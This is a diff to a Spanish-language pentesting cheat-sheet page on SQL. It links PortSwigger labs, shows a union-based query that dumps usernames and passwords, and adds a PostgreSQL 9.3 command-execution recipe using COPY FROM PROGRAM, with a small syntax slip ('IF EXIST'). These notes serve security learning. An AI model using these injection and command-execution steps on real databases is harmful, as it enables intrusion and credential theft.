@@ -11,6 +11,7 @@ published: true
 <p> 	* Mas información de sql en cuanto a código respecta <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet"> aquí </a></p>
 <p> 	* Mas laboratorios de pentesting : <a href="https://portswigger.net/web-security/all-labs">aqui</a></p>
 <br>
+
 ```python
 
 mysql -u{useraname} -p{password} # Conectar a la base de datos.
@@ -81,8 +82,23 @@ select * from users union select NULL,NULL,group_concat(User,0x3a,Password) from
 
 ```
 
+<br>
+<center># PostgreSql RCE 9.3</center>
 
+1. Eliminación de tabla en el caso de que sea existente.
 
+```sql
+DROP TABLE IF EXIST cmd_exec;
+```
 
+2. Creación de la tabla para la inyección de comando arbitrarios.
 
+```sql
+ CREATE TABLE cmd_exec(cmd_output text);
+```
 
+3. Inyección de comandos
+
+```sql
+ COPY cmd_exec from PROGRAM 'whoami';
+```
